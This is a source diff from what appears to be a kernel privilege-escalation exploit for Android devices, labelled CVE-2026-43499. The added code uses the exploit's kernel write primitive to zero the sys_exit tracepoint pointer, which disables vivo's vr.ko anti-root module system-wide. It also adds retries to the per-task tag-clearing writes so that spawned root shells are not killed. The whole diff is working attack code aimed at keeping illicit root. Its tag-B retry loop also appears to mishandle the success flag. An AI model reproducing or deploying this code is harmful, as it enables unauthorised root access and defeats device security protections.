@@ -119,6 +119,85 @@ namespace ghostlock::session::backend {
             victim::VictimContext &pipes = session.victim;
             int32_t &child_alive = chain.child_alive;
 
+            /* ------------------------------------------------------------------
+             * vr1: global vr.ko sys_exit probe kill-switch (PR #241 direction).
+             * Runs before the victim is spawned so the step protocol stays
+             * strictly serial (vr1 -> w2b -> w2a). /proc/modules is probed once
+             * per process; the result is shared with the per-task tag clear in
+             * w2b below. */
+            static int32_t vr_needed = -1;
+            support::run_state::enter("vr1");
+            if (vr_needed < 0) {
+                vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+                if (FILE *m = fopen("/proc/modules", "r")) {
+                    auto close_modules = ghostlock::support::make_scope_exit(
+                        [m]() noexcept { fclose(m); });
+                    std::array<char, 256> mod{};
+                    vr_needed = 0;
+                    while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
+                        const std::string_view line(mod.data());
+                        /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
+                         * then the module-name separator. */
+                        const bool vr_prefix =
+                                line.size() >= 2 &&
+                                (line[0] == 'v' || line[0] == 'V') &&
+                                (line[1] == 'r' || line[1] == 'R');
+                        if (vr_prefix && line.size() > 2 &&
+                            (line[2] == ' ' || line[2] == '_')) {
+                            vr_needed = 1;
+                            break;
+                        }
+                    }
+                }
+                pr_info("vr.ko %s\n", vr_needed
+                        ? "loaded; clearing tags"
+                        : "not loaded; skipping tag clear");
+            }
+            if (vr_needed) {
+                /* NULL the sys_exit tracepoint's funcs pointer, profile-gated
+                 * via offset.sys_exit_tp_funcs (0 = not provided = skip).
+                 * __DO_TRACE guards its probe loop with `if (it_func_ptr)`, so
+                 * a NULL funcs pointer turns every sys_exit probe — vr.ko's
+                 * kill path included — into a no-op for every task in the
+                 * system, not just this child. That covers the root shells and
+                 * late-load helpers the rooted child forks later, which the
+                 * per-task clear in w2b cannot reach. Data-only write,
+                 * idempotent, KCFI-safe.
+                 * The original PR #241 proposal redirected individual vr probe
+                 * entries to a probestub through a resident kernel-read
+                 * channel; this tree's primitives are write-only, so the funcs
+                 * *pointer* itself is NULLed instead — no probe address or
+                 * array walk needed. One successful write lasts until reboot;
+                 * the static flag keeps chain retries from repeating it.
+                 * Retried with the W2 rhythm: a single lost race must not
+                 * silently discard the whole global layer. */
+                static int32_t vr_global_done = 0;
+                const uintptr_t tp_funcs = ghostlock::profile::sys_exit_tp_funcs();
+                if (!vr_global_done && tp_funcs) {
+                    const memory::WriteRequest tp_request = memory::WriteRequest::make(
+                        tp_funcs, memory::WriteMode::Zero, 1);
+                    const uint32_t tp_attempts = g_exploit_session.profile.w2_attempts();
+                    for (uint32_t attempt = 1; attempt <= tp_attempts; attempt++) {
+                        if (attempt > 1) {
+                            pr_warning("VR: sys_exit tp write %u missed; backing off\n",
+                                       attempt);
+                            usleep(100000);
+                        }
+                        if (Cve2026_43499Policy::template attack_write<M>(
+                                session, tp_request, "VR: sys_exit tp")) {
+                            vr_global_done = 1;
+                            usleep(g_exploit_session.profile.w2_settle_us());
+                            pr_success("VR.ko sys_exit probes disabled globally\n");
+                            break;
+                        }
+                    }
+                    if (!vr_global_done) {
+                        pr_warning("VR: global disable missed; relying on per-task clear\n");
+                    }
+                }
+            }
+            support::run_state::complete("vr1");
+
             const auto spawned = victim::spawn_victim(pipes);
             if (!spawned) {
                 pr_warning("fork failed\n");
@@ -146,9 +225,10 @@ namespace ghostlock::session::backend {
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
          * ------------------------------------------------------------------
-         * Always compiled: the /proc/modules probe below decides at runtime
-         * whether the writes run. The tag-B offset is overridable at build time
-         * (profile/macros.h), not gated by a define.
+         * Always compiled: the vr_needed probe ran in the vr1 step above, so
+         * these writes only run when vr.ko is actually loaded. The tag-B
+         * offset is overridable at build time (profile/macros.h), not gated
+         * by a define.
          *
          * vr.ko tags every app-origin task at fork/clone time. When the task
          * later holds euid 0, the sys_exit tracepoint probe kills it. We must
@@ -164,50 +244,55 @@ namespace ghostlock::session::backend {
          * ------------------------------------------------------------------ */
             support::run_state::enter("w2b");
             {
-                static int32_t vr_needed = -1;
-                if (vr_needed < 0) {
-                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
-                    if (FILE *m = fopen("/proc/modules", "r")) {
-                        auto close_modules = ghostlock::support::make_scope_exit(
-                            [m]() noexcept { fclose(m); });
-                        std::array<char, 256> mod{};
-                        vr_needed = 0;
-                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
-                            const std::string_view line(mod.data());
-                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
-                             * then the module-name separator. */
-                            const bool vr_prefix =
-                                    line.size() >= 2 &&
-                                    (line[0] == 'v' || line[0] == 'V') &&
-                                    (line[1] == 'r' || line[1] == 'R');
-                            if (vr_prefix && line.size() > 2 &&
-                                (line[2] == ' ' || line[2] == '_')) {
-                                vr_needed = 1;
-                                break;
-                            }
-                        }
-                    }
-                    pr_info("vr.ko %s\n", vr_needed
-                            ? "loaded; clearing tags"
-                            : "not loaded; skipping tag clear");
-                }
-
                 int32_t vr_ok = 1;
                 if (vr_needed) {
-                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit).
+                     * Same retry rhythm as W2: a single lost race used to leave the
+                     * victim tagged, and the first getuid() of W2 verify would then
+                     * get it killed, burning a whole chain round. */
+                    const uint32_t vr_attempts = g_exploit_session.profile.w2_attempts();
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
-                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
+                    for (uint32_t attempt = 1; attempt <= vr_attempts; attempt++) {
+                        if (attempt > 1) {
+                            pr_warning("VR: flags+tagA write %u missed; backing off\n",
+                                       attempt);
+                            usleep(100000);
+                        }
+                        if (Cve2026_43499Policy::template attack_write<M>(
+                                session, flags_request, "VR: flags+tagA")) {
+                            vr_ok = 1;
+                            break;
+                        }
+                        vr_ok = 0;
+                    }
 
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders.
+                     * vr.ko treats an out-of-sync tag pair (one set, one clear)
+                     * as tampering and kills on that alone, so this write must
+                     * land too — it gets the same retry loop. */
                     if (vr_ok) {
                         uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
-                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
+                        for (uint32_t attempt = 1; attempt <= vr_attempts; attempt++) {
+                            if (attempt > 1) {
+                                pr_warning("VR: tagB write %u missed; backing off\n",
+                                           attempt);
+                                usleep(100000);
+                            }
+                            if (Cve2026_43499Policy::template attack_write<M>(
+                                    session, tagb_request, "VR: tagB")) {
+                                break;
+                            }
+                            vr_ok = 0;
+                        }
                     }
 
                     if (vr_ok) {
+                        /* Let both writes land before W2 verify runs the child's
+                         * getuid() through the syscall exit path. */
+                        usleep(g_exploit_session.profile.w2_settle_us());
                         pr_success("VR.ko per-task tags cleared\n");
                     } else {
                         pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
